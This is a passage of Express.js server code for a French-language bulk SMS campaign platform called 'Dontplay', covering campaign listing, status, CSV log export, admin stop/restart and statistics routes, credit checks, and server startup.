/* Alias /api/sender/sms/campaigns* */
app.get('/api/sender/sms/campaigns', requireAuth, (req, res) => {
  const campaigns = smsRuntime.storage.listCampaigns(req.session.userId)
    .sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0))
    .map(serializeCampaign);
  res.json({ campaigns });
});
app.get('/api/sender/sms/campaigns/:id/status', requireAuth, (req, res) => {
  const c = smsRuntime.storage.getCampaign(req.params.id);
  if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
  const sc = serializeCampaign(c);
  res.json({ id: sc.id, name: sc.name, sent: sc.sentCount, failed: sc.failedCount, pending: sc.pendingCount, status: sc.status });
});
app.get('/api/sender/sms/campaigns/:id/logs', requireAuth, (req, res) => {
  const c = smsRuntime.storage.getCampaign(req.params.id);
  if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
  const logs = smsRuntime.storage.listLogs({ campaignId: req.params.id });
  if (req.query.format === 'csv') {
    const csv = ['createdAt,phone,status,error', ...logs.map(l => [l.createdAt, l.phone, l.status, JSON.stringify(l.error || '')].join(','))].join('\n');
    res.setHeader('Content-Disposition', `attachment; filename="logs-${req.params.id}.csv"`);
    return res.type('text/csv').send(csv);
  }
  res.json({ logs });
});

app.get('/api/sender/sms/balance', requireAuth, async (req, res) => {
  const user = await db.findUserById(req.session.userId);
  if (!user) return res.status(401).json({ error: 'Session invalide.' });
  res.json({ balance: user.balance ?? 0, currency: 'EUR' });
});

/* ── Campagnes admin globales ──────────────────────────────── */
app.get('/api/admin/sms/campaigns', requireAuth, requireAdmin, adminLimiter, (_req, res) => {
  const campaigns = smsRuntime.storage.listCampaigns().map(serializeCampaign)
    .sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  res.json({ campaigns });
});

app.get('/api/admin/sms/campaigns/:id', requireAuth, requireAdmin, adminLimiter, (req, res) => {
  const c = smsRuntime.storage.getCampaign(req.params.id);
  if (!c) return res.status(404).json({ error: 'Campagne introuvable.' });
  res.json({ campaign: serializeCampaign(c), recipients: (c.recipients || []).slice(0, 1000), logs: smsRuntime.storage.listLogs({ campaignId: c.id }) });
});

app.post('/api/admin/sms/campaigns/:id/stop', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const c = smsRuntime.storage.getCampaign(req.params.id);
    if (!c) return res.status(404).json({ error: 'Campagne introuvable.' });
    const campaign = await smsRuntime.sender.stopCampaign(req.params.id);
    res.json({ success: true, campaign: serializeCampaign(campaign) });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/admin/sms/campaigns/:id/restart', requireAuth, requireAdmin, adminLimiter, validateCsrf, async (req, res) => {
  try {
    const c = smsRuntime.storage.getCampaign(req.params.id);
    if (!c) return res.status(404).json({ error: 'Campagne introuvable.' });
    const rec = (Array.isArray(c.recipients) ? c.recipients : []).map(r => ({ ...r, status: 'pending', attempts: 0, error: null, providerUsed: null, sentAt: null }));
    await smsRuntime.storage.updateCampaign(c.id, { recipients: rec, sentCount: 0, failedCount: 0, status: 'pending', completedAt: null, debitDone: false });
    const campaign = smsRuntime.storage.getCampaign(c.id);
    res.json({ success: true, campaign: serializeCampaign(campaign) });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/admin/sms/stats/global', requireAuth, requireAdmin, adminLimiter, (_req, res) => {
  const stats = smsRuntime.storage.stats();
  const campaigns = smsRuntime.storage.listCampaigns();
  const sent = campaigns.reduce((n, c) => n + (c.sentCount || 0), 0);
  const failed = campaigns.reduce((n, c) => n + (c.failedCount || 0), 0);
  res.json({ ...stats, sent, failed, successRate: sent + failed ? Number(((sent / (sent + failed)) * 100).toFixed(2)) : 0 });
});

app.get('/api/admin/sms/stats/providers', requireAuth, requireAdmin, adminLimiter, (_req, res) => {
  const stats = smsRuntime.storage.stats();
  const providers = smsRuntime.providerManager.list().map(p => ({
    id: p.id,
    name: p.name,
    type: p.type,
    active: p.active,
    priority: p.priority,
    countries: p.countries,
    metrics: stats.byProvider?.[p.id] || { total: 0, success: 0, failed: 0 },
  }));
  res.json({ providers });
});

app.get('/api/admin/sms/stats/clients/:userId', requireAuth, requireAdmin, adminLimiter, async (req, res) => {
  const user = await db.findUserById(req.params.userId);
  if (!user) return res.status(404).json({ error: 'Utilisateur introuvable.' });
  const campaigns = smsRuntime.storage.listCampaigns(req.params.userId);
  const sent = campaigns.reduce((n, c) => n + (c.sentCount || 0), 0);
  const failed = campaigns.reduce((n, c) => n + (c.failedCount || 0), 0);
  res.json({
    userId: user.id,
    username: user.username,
    campaigns: campaigns.length,
    sent,
    failed,
    balance: user.balance ?? 0,
    smsRouteMode: user.smsRouteMode || 'auto',
    smsRoutes: user.smsRoutes || [],
  });
});

app.get('/api/sender/providers/status', requireAuth, requireAdmin, (_req, res) => {
  res.json(smsRuntime.providerManager.stats());
});

/* ── Anciennes routes — compatibilité ──────────────────────── */
app.post('/api/sender/sms/create', requireAuth, validateCsrf, async (req, res) => {
  try {
    const user = await db.findUserById(req.session.userId);
    if (!user) return res.status(401).json({ error: 'Session invalide.' });
    if (!requireSenderAccess(user)) return res.status(403).json({ error: 'Seul le plan Max a accès au Sender SMS.' });

    const { name, message, numbers, contacts } = req.body || {};
    if (!name || !message) {
      return res.status(400).json({ error: 'name et message requis.' });
    }

    let rows;
    if (Array.isArray(contacts) && contacts.length) {
      rows = contacts.map(c => [
        c.phone || c.phoneRaw || '',
        c.first || c.first_name || '',
        c.last || c.last_name || '',
        c.company || '',
        c.city || '',
        c.zip || '',
        c.email || '',
      ]);
    } else if (Array.isArray(numbers) && numbers.length) {
      rows = numbers.map(n => [String(n || '').trim(), '', '', '', '', '', '']);
    } else {
      return res.status(400).json({ error: 'contacts[] ou numbers[] requis.' });
    }
    rows.unshift(['phone', 'first', 'last', 'company', 'city', 'zip', 'email']);
    const parsed = smsRuntime.parser.parseRows(rows, { defaultDial: '+33' });
    if (!parsed.contacts.length) return res.status(400).json({ error: 'Aucun numéro valide.' });

    const cost = parsed.contacts.length * (config.sms.costPerSms || 1);
    if ((user.balance ?? 0) < cost) {
      return res.status(402).json({ error: 'Crédits insuffisants.', cost, balance: user.balance ?? 0 });
    }

    const campaign = smsRuntime.sender.createCampaign({
      userId: user.id,
      name,
      message,
      recipients: parsed.contacts,
      speed: 20,
      scheduledFor: null,
      senderId: '',
    });

    const keep = Array.isArray(user.smsCampaigns) ? user.smsCampaigns : [];
    await db.updateUser(user.id, { smsCampaigns: [...keep, serializeCampaign(campaign)].slice(-200) });

    res.json({
      success: true,
      campaign: {
        id: campaign.id,
        name: campaign.name,
        sent: 0,
        status: campaign.status,
        created: campaign.createdAt,
      },
      sent: 0,
      total: campaign.totalNumbers,
    });
  } catch (err) {
    console.error('[sms/create compat]', err);
    res.status(500).json({ error: 'Erreur serveur.' });
  }
});

app.get('/api/sender/sms/list', requireAuth, async (req, res) => {
  const campaigns = smsRuntime.storage.listCampaigns(req.session.userId)
    .sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0))
    .map(c => ({
      id: c.id,
      name: c.name,
      total: c.totalNumbers || (c.recipients || []).length,
      sent: c.sentCount || 0,
      failed: c.failedCount || 0,
      status: c.status,
      created: c.createdAt,
    }));
  res.json({ campaigns });
});

app.get('/api/sender/sms/status/:campaignId', requireAuth, async (req, res) => {
  const c = smsRuntime.storage.getCampaign(req.params.campaignId);
  if (!assertCampaignOwner(req, c)) return res.status(404).json({ error: 'Campagne introuvable.' });
  const sc = serializeCampaign(c);
  res.json({
    id: sc.id,
    name: sc.name,
    sent: sc.sentCount,
    status: sc.status,
    created: sc.createdAt,
    updated: sc.updatedAt,
    failed: sc.failedCount,
    pending: sc.pendingCount,
  });
});

app.use(express.static(ROOT, {
  index:    false,
  dotfiles: 'deny',
}));

/* 404 */
app.use((req, res) => {
  if (req.accepts('html')) return res.redirect('/login');
  res.status(404).json({ error: 'Not found' });
});

/* ═══════════════════════════════════════════════════════════════
   DÉMARRAGE
   ═══════════════════════════════════════════════════════════════ */
const server = app.listen(config.server.port, config.server.host, () => {
  console.log('\n  ✓ Dontplay démarré');
  console.log(`  → http://${config.server.host}:${config.server.port}`);
  console.log(`  → DB  : ${config.db.type}`);
  console.log(`  → ENV : ${process.env.NODE_ENV || 'development'}\n`);
});
server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`\n  ✗ Le port ${config.server.port} est déjà utilisé.`);
    console.error('    Fermez l\'autre processus ou changez le port dans config.js.\n');
  } else {
    console.error('\n  ✗ Erreur au démarrage :', err.message, '\n');
  }
  process.exit(1);
});
